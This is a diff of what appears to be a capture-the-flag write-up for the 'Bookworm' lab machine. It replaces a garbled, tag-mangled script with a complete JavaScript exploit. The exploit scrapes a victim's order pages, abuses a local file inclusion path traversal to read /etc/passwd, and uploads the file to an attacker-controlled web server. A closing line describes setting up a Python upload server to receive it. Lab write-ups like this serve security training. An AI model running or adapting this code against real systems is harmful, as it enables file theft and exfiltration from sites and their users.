@@ -809,8 +809,85 @@ function extractOrders(pageContent){
     var orders = new Array();
     //Process each lines of the data passed in the "pageContent" parameter
     //We start the loop at 1 to skip the line containing "Order History"
-    for(var i=1;i<lines.length;i++){ !="-1){" "="" ")="" "...="" "exfil");="" "octet="" "orders"="" &&="" (index="" (xhr.readystate="4" *="" 200...="" 70)="" 71st="" ;="" <="" a="" add="" always="" and="" array="" attacker="" attacker+"="" avoid="" blob="new" blob([xhr.response],="" blob,="" bookworm.htb="" check="" code="" contains="" data="" download="" downloadlink="extractDownloadLink(getOrders());" each="" exfil="new" exfil.open("post",="" exfil.send(fd);="" exfiltrate="" exfiltratedata();<="" exfiltratedata(){="" exploit="" extract="" extractdownloadlink(ordersarray){="" extractorders(request.responsetext);="" false);="" fd="new" fd.append('files',="" file="" for="" for(var="" formdata();="" from="" function="" get="" getorders(){="" hanging="" higher="" http="" http:="" hyperlink="" i="0;i&lt;orders_number;i++){" id="" ids="" if="" if(line.indexof("="" if(max_order="" if(request.status="200){" is="" it="" later="" lfi="" line="" link="" list="" long="" max_order="" much="" number="" or="" order="" orders="" orders.push(string[0]);="" orders;="" orders_number="max_order;" orders_number){="" page="" prevent="" process="" processing="" profile="" profile_url,="" receive="" request="" request.open('get',="" request.send(null);="" response="" retrieve="" return="" run="" script="" send="" server="" stream"});="" string='string[1].split("\"");' string[0];="" than="" the="" to="" too="" true);="" try="" upload",="" url="base_url+downloadLink;" url,="" used="" valid="" var="" we="" web="" webserver="" which="" xhr="new" xhr.onreadystatechange="function()" xhr.open("get",="" xhr.responsetype="arraybuffer" xhr.send();="" xhr.status="200)" xmlhttprequest();="" {="" {type:="" }="">
-</lines.length;i++){></code></pre>
+    for(var i=1;i&lt;lines.length;i++){
+        var line = lines[i];
+        //If the line contains "/order/"...
+        if(line.indexOf("/order/") != -1){
+            //We extract the order id from the hyperlink
+            var string = line.split("/order/");
+            string = string[1].split("\"");
+            //Add the order number to the "orders" array
+            orders.push(string[0]);
+        }
+    }
+    //Return the list or order ids
+    return orders;
+}
+
+//Function used to extract a valid download link from http://bookworm.htb/order/*
+function extractDownloadLink(ordersArray){
+    var orders_number = ordersArray.length;
+    //Check if orders number is higher than max_order to avoid the script hanging for too long and prevent it from processing too much orders
+    if(max_order &lt; orders_number){
+        orders_number = max_order;
+    }
+    //We process each orders
+    for(var i=0;i&lt;orders_number;i++){
+        //We send a request to the order page
+        var request = new XMLHttpRequest();
+        var url = base_url+"/order/"+ordersArray[i];
+        request.open('GET', url, false);
+        request.send(null);
+        //If we receive HTTP response code 200...
+        if(request.status === 200){
+            //We retrieve the 71st line (index 70) which always contains a download link
+            var line = request.responseText.split("\n")[70];
+            //We extract the URL from the line
+            var string = line.split("href=\"");
+            string = string[1].split("\"");
+            return string[0];
+        }
+    }
+}
+
+//Function used to get orders list from the profile page
+function getOrders(){
+    var request = new XMLHttpRequest();
+    request.open('GET', profile_url, false);
+    request.send(null);
+    if(request.status === 200){
+        return extractOrders(request.responseText);
+    }
+}
+
+//Exploit the LFI and exfiltrate files to the attacker webserver on port 80 (I used the uploadserver module for python3)
+function exfiltrateData(){
+    //Extract a valid download link to later exploit the LFI
+    var downloadLink = extractDownloadLink(getOrders());
+    //Create the link to exploit the LFI
+    var lfi_url = base_url+downloadLink;
+    var url = lfi_url+"&bookIds=../../../../etc/passwd";
+    //Send a GET request to the download page trying to exploit LFI
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.onreadystatechange = function() {
+        //If we receive HTTP response code 200...
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            //Send the file to the attacker webserver
+            var blob = new Blob([xhr.response], {type: "octet/stream"});
+            var exfil = new XMLHttpRequest();
+            exfil.open("POST", attacker+"/upload", true);
+            var fd = new FormData();
+            fd.append('files', blob, "exfil");
+            exfil.send(fd);
+        }
+    }
+    xhr.responseType = "arraybuffer";
+    xhr.send();
+}
+
+//Run the exploit
+exfiltrateData();</code></pre>
 <p id="6740aca5-0d47-4f60-bd57-8984b15f10a3">
 First, we need to start a python web server that supports file uploads. We can use the module <a href="https://pypi.org/project/uploadserver/"><strong>uploadserver</strong>
 </a>
